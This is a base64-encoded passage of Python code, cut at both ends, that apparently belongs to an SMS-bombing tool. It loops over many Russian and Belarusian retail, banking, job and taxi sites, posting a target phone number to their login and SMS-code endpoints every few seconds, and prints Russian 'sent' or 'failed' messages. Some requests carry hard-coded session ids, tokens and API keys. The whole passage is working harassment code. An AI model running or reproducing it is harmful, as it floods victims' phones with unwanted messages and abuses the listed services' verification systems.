ICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGVudGVyID0gJysgJyArIHN0cihwaG9uZSlbOi0xMF0gKyAnICggJyArIHN0cihwaG9uZSlbMTotN10gKyAnICkgJyArIHN0cihwaG9uZSlbNDotNF0gKyAnLScgKyBzdHIocGhvbmUpWzc6LTJdICsgJy0nICsgc3RyKHBob25lKVs5Ol0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL25ldy5tb3kubWFnbml0LnJ1L2xvY2FsL2FqYXgvbG9naW4vJywgZGF0YT17J3Bob25lJzogZW50ZXJ9LCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL3dlYi1hcGkuYXB0ZWthLWFwcmlsLnJ1L3VzZXJzJywganNvbj17InBob25lIjpwaG9uZSwicGFzc3dvcmQiOiJxVWJqaWstdmVxc28wLWpvYnBlayIsIm5hbWUiOiJEbWl0cnkiLCJzbmFtZSI6IiJ9LCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGVudGVyID0gc3RyKHBob25lKVsxOl0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vYmVsYmF6YXIyNC5ieS9hamF4LnBocD9hY3Rpb249Z2V0X3Ntc19jb2RlJmFjdD1zbXMmcGhvbmVfY29kZT03JnBob25lPXt9JnBob25lX3Ntc19jb2RlPScuZm9ybWF0KGVudGVyKSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRlciA9ICcrJyArIHN0cihwaG9uZSlbOi0xMF0gKyAnICgnICsgc3RyKHBob25lKVsxOi03XSArICcpICcgKyBzdHIocGhvbmUpWzQ6XQogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vbWFya2Zvcm1lbGxlLmJ5L2xvY2FsL3RlbXBsYXRlcy9tYXJrZm9ybWVsbGUvY29tcG9uZW50cy9iaXRyaXgvc3lzdGVtLmF1dGguZm9ybS9tZi9hamF4LnBocCcsIGRhdGE9eydwaG9uZSc6ZW50ZXJ9LCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGVudGVyID0gJysnICsgc3RyKHBob25lKVs6LTEwXSArICcgKCcgKyBzdHIocGhvbmUpWzE6LTddICsgJykgJyArIHN0cihwaG9uZSlbNDotNF0gKyAnLScgKyBzdHIocGhvbmUpWzc6LTJdICsgJy0nICsgc3RyKHBob25lKVs5Ol0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL3N0b2xuaWsyNC5ydS9hamF4L3Jtcy9vdGhlci9hdXRoLnJlZ2lzdGVyLnBocD9hdXRoPXknLCBkYXRhPXsncGhvbmUnOiBlbnRlciwgJ3NlbmRQYXNzd29yZFNtcyc6ICd5J30sIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vbG95bWF4Lml2b2luLnJ1L3B1YmxpY2FwaS92MS4yL1JlZ2lzdHJhdGlvbi9CZWdpblJlZ2lzdHJhdGlvbicsIGpzb249eyJwYXNzd29yZCI6IiIsImxvZ2luIjpwaG9uZX0sIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZW50ZXIgPSAnKycgKyBzdHIocGhvbmUpWzotMTBdICsgJyAoJyArIHN0cihwaG9uZSlbMTotN10gKyAnKSAnICsgc3RyKHBob25lKVs0Oi00XSArICctJyArIHN0cihwaG9uZSlbNzotMl0gKyAnLScgKyBzdHIocGhvbmUpWzk6XQogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vd3d3Lmd1bGxpdmVyLnJ1L2FwaS9hdXRob3JpemF0aW9uL3Bob25lL2NvZGVfcmVxdWVzdCcsIGpzb249eyJwaG9uZSI6ZW50ZXIsInRva2VuIjoiNDQ1NDE2NDM3NzYzNjRiZjA4ZDg4YWMyMDQyMjc2YmExNDgyMmZkYjQzZWRiY2FhNjg3NmIwMWRmNGMxZmVmYTQ0NTQxNjQzNzc2MzY0YmYwOGQ4OGFjMjA0MjI3NmJhNDQ1NDE2NDM3NzYzNjRiZjA4ZDg4YWMyMDQyMjc2YmExNDgyMmZkYjQzZWRiY2FhNjg3NmIwMWRmNGMxZmVmYTQ0NTQxNjQzNzc2MzY0YmYwOGQ4OGFjMjA0MjI3NmJhMTQ4MjJmZGI0M2VkYmNhYTY4NzZiMDFkZjRjMWZlZmE0NDU0MTY0Mzc3NjM2NGJmMDhkODhhYzIwNDIyNzZiYTQ0NTQxNjQzNzc2MzY0YmYwOGQ4OGFjMjA0MjI3NmJhMTQ4MjJmZGI0M2VkYmNhYTY4NzZiMDFkZjRjMWZlZmE0NDU0MTY0Mzc3NjM2NGJmMDhkODhhYzIwNDIyNzZiYTE0ODIyZmRiNDNlZGJjYWE2ODc2YjAxZGY0YzFmZWZhNDQ1NDE2NDM3NzYzNjRiZjA4ZDg4YWMyMDQyMjc2YmExNDgyMmZkYjQzZWRiY2FhNjg3NmIwMWRmNGMxZmVmYTQ0NTQxNjQzNzc2MzY0YmYwOGQ4OGFjMjA0MjI3NmJhIn0sIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZW50ZXIgPSAnKycgKyBzdHIocGhvbmUpWzotMTBdICsgJyAoJyArIHN0cihwaG9uZSlbMTotN10gKyAnKSAnICsgc3RyKHBob25lKVs0Oi00XSArICctJyArIHN0cihwaG9uZSlbNzpdCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly92c2V2b2xvZ2hzay50YXhvdmljaGtvZi5ydS9hcGkvdXNlclNlbmRTbXMnLCBkYXRhPXsndXNlcm5hbWUnOiBlbnRlciwnbGFuZyc6ICdydScsJ2NpdHknOiAndnN2bCd9LCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGVudGVyID0gJysnICsgc3RyKHBob25lKQogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vdnNldm9sb2pzay5yYWJvdGEucnUvYXBpLXdlYi92Ni9jb2RlL3NlbmQuanNvbicsIGpzb249eyJyZXF1ZXN0Ijp7ImxvZ2luIjplbnRlcn0sInJlcXVlc3RfaWQiOjQ4Njc2NDQ0LCJhcHBsaWNhdGlvbl9pZCI6MTMsInJhYm90YV9ydV9pZCI6IjYxZDBiZTgwMjkxNTYxMDAyNzExMDM0MDY0Mzg1OTU0IiwidXNlcl90YWdzIjpbeyJpZCI6MCwiYWRkX2RhdGUiOiIyMDIyLTAxLTAxIiwibmFtZSI6ImhyX2Jhbm5lcnNfc2hvdyJ9LHsiaWQiOjAsImFkZF9kYXRlIjoiMjAyMi0wMS0wMSIsIm5hbWUiOiJ3ZWJfcHJlbWl1bV90YXJnZXQifSx7ImlkIjowLCJhZGRfZGF0ZSI6IjIwMjItMDEtMDEiLCJuYW1lIjoiY291cnNlc193aWRnZXRfdGFyZ2V0In0seyJpZCI6MCwiYWRkX2RhdGUiOiIyMDIyLTAxLTAxIiwibmFtZSI6InNlYXJjaF9leGNsdWRlX3JlbG9jMl90YXJnZXQifSx7ImlkIjowLCJhZGRfZGF0ZSI6IjIwMjItMDEtMDEiLCJuYW1lIjoid2ViX3NlYXJjaF9hbGxfcmVnaW9uczJfdGFyZ2V0MSJ9LHsiaWQiOjAsImFkZF9kYXRlIjoiMjAyMi0wMS0wMSIsIm5hbWUiOiJwcm9mZXNzaW9uX3dpZGdldF90YXJnZXQifSx7ImlkIjowLCJhZGRfZGF0ZSI6IjIwMjItMDEtMDEiLCJuYW1lIjoidXNlX3Z3b19zZXJ2aWNlIn1dfSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRlciA9IHN0cihwaG9uZSlbOi0xMF0gKyAnICcgKyBzdHIocGhvbmUpWzE6LTddICsgJyAnICsgc3RyKHBob25lKVs0Oi00XSArICcgJyArIHN0cihwaG9uZSlbNzotMl0gKyAnICcgKyBzdHIocGhvbmUpWzk6XQogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vc29jaWFsLmpvdXJuYWwudGlua29mZi5ydS9hcGkvdjIwL2FjY291bnQvbG9naW4vcGhvbmUvJywganNvbj17InBob25lIjplbnRlciwicG9pbnRfb2ZfY29udGFjdCI6ImhlYWRlci1sb2dpbi1idXR0b24ifSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRlciA9ICcrJyArIHBob25lCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncm91cHByaWNlLnJ1L2F1dGhfcGhvbmUvc2VuZF9waG9uZV90b2tlbicsIGRhdGE9eydwaG9uZSc6IGVudGVyLCd0aW1lX3pvbmUnOiAxODB9LCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGVudGVyID0gJzgnICsgc3RyKHBob25lKVsxOl0KICAgICAgICAgICAgICAgIGhlYWQgPSB7J1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTVfNykgQXBwbGVXZWJLaXQvNjA1LjEuMTUgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzE1LjIgU2FmYXJpLzYwNS4xLjE1J30KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL3d3dy50cmFla3RvcmlhLnJ1L2xvY2FsL2FqYXgvYXV0aG9yaXplLnBocD9hY3Rpb249MicsaGVhZGVycz1oZWFkLCBkYXRhPXsncGhvbmUnOiBlbnRlciwnYnhzZXNzaWQnOiAnMjE2NmU2OWUxOTM3Njk0ODZkNjhiY2VhODIxZjI5YmYnLCdsaWQnOiAndHInfSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRlciA9ICclMjUyQicgKyBzdHIocGhvbmUpWzotMTBdICsgJyUyNTIwKCcgKyBzdHIocGhvbmUpWzE6LTddICsgJyknICsgJyUyNTIwJyArIHN0cihwaG9uZSlbNDotNF0gKyAnLScgKyBzdHIocGhvbmUpWzc6LTJdICsgJy0nICsgc3RyKHBob25lKVs5Ol0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vc2VkaS5ydS93ZWJhcGk/Y2FsbGJhY2s9alF1ZXJ5MTkxMDU1OTc4MzQ0NTYwMzM5NjRfMTY0MTA3MjIxMzgyNiZxPWdldF9hY3RpdmF0aW9uX2tleSZwaG9uZT17fSZ3YXk9YnlzbXMmdXNlcnR5cGU9Y3VzdG9tZXImbGFuZz1ydS1SVSZhcGlrZXk9OTc2QjgyOTItMDg2RS00RDM3LThCNjctMEY1NkVDNDlFNzFFJmRlYnVnaW5mbz1HTVQlMkIwMzAwKyhNU0spK1RaLTE4MCtOT19DT09LSUUrMTQ0MHg5MDAraHR0cHMlM0ElMkYlMkZ0YXhpZGVzaGV2by5jb20lMkZsb2dpbiZ3ZWJDbGllbnRWZXJzaW9uPTIwMjExMjI5MTcyNTQ3JnN0b2tlbj1jZTA0Yjk3MjI3ZjA2OWExZDk1OGJkZjU1NmI4Y2NkOSZfPTE2NDEwNzIyMTM4MzAnLmZvcm1hdChlbnRlciksIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZW50ZXIgPSAnJTI1MkInICsgc3RyKHBob25lKVs6LTEwXSArICclMjUyMCgnICsgc3RyKHBob25lKVsxOi03XSArICcpJyArICclMjUyMCcgKyBzdHIocGhvbmUpWzQ6LTRdICsgJy0nICsgc3RyKHBob25lKVs3Oi0yXSArICctJyArIHN0cihwaG9uZSlbOTpdCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3NlZGkucnUvd2ViYXBpP2NhbGxiYWNrPWpRdWVyeTE5MTA3MzgwNTM3ODc0MTQ3OTQ3XzE2NDEwNzMzNTEwNTMmcT1nZXRfYWN0aXZhdGlvbl9rZXkmcGhvbmU9e30md2F5PWJ5c21zJnVzZXJ0eXBlPWN1c3RvbWVyJmxhbmc9cnUtUlUmYXBpa2V5PUE3OTRCNTIzLUYxRkQtNEMyNy04NkVGLUJBNDZDQ0JBNzJEMCZkZWJ1Z2luZm89R01UJTJCMDMwMCsoTVNLKStUWi0xODArTk9fQ09PS0lFKzE0NDB4OTAwK2h0dHBzJTNBJTJGJTJGdGF4aS1wcm90YXhpLnJ1JTJGemFrYXphdC10YWtzaSUyRitVc2VyJTI1MjBkZW5pZWQlMjUyMEdlb2xvY2F0aW9uJndlYkNsaWVudFZlcnNpb249MjAyMTEyMjkxNzI1NDcmc3Rva2VuPWVhNzk1ZjIxODBhY2RiOWVjYmNjZGNlOWJlZmRiM2ZiJl89MTY0MTA3MzM1MTA1OScuZm9ybWF0KGVudGVyKSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRlciA9ICclMjUyQicgKyBzdHIocGhvbmUpWzotMTBdICsgJyUyNTIwKCcgKyBzdHIocGhvbmUpWzE6LTddICsgJyknICsgJyUyNTIwJyArIHN0cihwaG9uZSlbNDotNF0gKyAnLScgKyBzdHIocGhvbmUpWzc6LTJdICsgJy0nICsgc3RyKHBob25lKVs5Ol0KICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vc3BiMi5zZWRpLnJ1L3dlYmFwaT9jYWxsYmFjaz1qUXVlcnkxOTEwOTQwMDc5NDg1MzM3NDIyMV8xNjQxMDc0MDM4MDExJnE9Z2V0X2FjdGl2YXRpb25fa2V5JnBob25lPXt9JndheT1ieXNtcyZ1c2VydHlwZT1jdXN0b21lciZsYW5nPXJ1LVJVJmFwaWtleT0yNzA1NTFENC0yNEJBLTQ1NjMtQjc4Ri0zMDUxM0MwOTJFQ0QmZGVidWdpbmZvPUdNVCUyQjAzMDArKE1TSykrVFotMTgwK05PX0NPT0tJRSsxNDQweDkwMCtodHRwcyUzQSUyRiUyRnRheGkteC5ydSUyRitVc2VyJTI1MjBkZW5pZWQlMjUyMEdlb2xvY2F0aW9uJndlYkNsaWVudFZlcnNpb249MjAyMTEyMjkxNzI1NDcmc3Rva2VuPTQ4Y2E3YWZjZjAzYWQwOWE5ZTE3ZjExYTk0MTE5OGM0Jl89MTY0MTA3NDAzODAxNScuZm9ybWF0KGVudGVyKSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7